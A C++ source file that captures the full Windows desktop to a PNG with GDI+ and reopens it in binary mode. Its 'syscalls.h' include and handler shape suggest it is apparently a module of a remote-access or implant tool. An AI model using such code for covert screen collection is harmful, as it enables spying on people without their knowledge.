#include "syscalls.h"
#include <gdiplus.h>

#pragma comment(lib, "Gdiplus.lib")

using namespace Gdiplus;

static int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	UINT num = 0;
	UINT size = 0;

	GetImageEncodersSize(&num, &size);
	if (size == 0)
		return -1;

	ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
	if (pImageCodecInfo == NULL)
		return -1;

	GetImageEncoders(num, size, pImageCodecInfo);
	for (UINT j = 0; j < num; ++j)
	{
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;
		}
	}

	free(pImageCodecInfo);
	return -1;
}

static bool CaptureScreenshot(std::wstring filePathStr)
{
	// Initialize GDI+
	GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

	// Get the desktop device context
	HDC hScreen = GetDC(NULL);
	HDC hDC = CreateCompatibleDC(hScreen);

	int width = GetSystemMetrics(SM_CXSCREEN);
	int height = GetSystemMetrics(SM_CYSCREEN);
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
	SelectObject(hDC, hBitmap);

	// Copy the screen to the bitmap
	BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);

	// Convert HBITMAP to GDI+ Bitmap
	Bitmap* bm = new Bitmap(hBitmap, NULL);

	// Save the bitmap as a PNG file
	CLSID pngClsid;
	GetEncoderClsid(L"image/png", &pngClsid);
	Status status = bm->Save(filePathStr.c_str(), &pngClsid, NULL);

	// Clean up
	delete bm;
	DeleteObject(hBitmap);
	DeleteDC(hDC);
	ReleaseDC(NULL, hScreen);
	GdiplusShutdown(gdiplusToken);

	return status == Ok;
}

bool captureScreenshot(std::string& result, std::ifstream& in) {
	std::filesystem::remove(SCREENSHOT_PATH);
	std::wstring wFilePath(SCREENSHOT_PATH.begin(), SCREENSHOT_PATH.end());
	const wchar_t* cFilePath = wFilePath.c_str();
	if (CaptureScreenshot(cFilePath)) {
		in.open(wFilePath, std::ios::binary);
		if (in.is_open()) {
			result = "Screenshot captured successfully.";
			return true;
		}
		else {
			result = "Failed to capture screenshot.";
			return false;
		}
	}
	else {
		result = "Failed to capture screenshot.";
		return false;
	}
}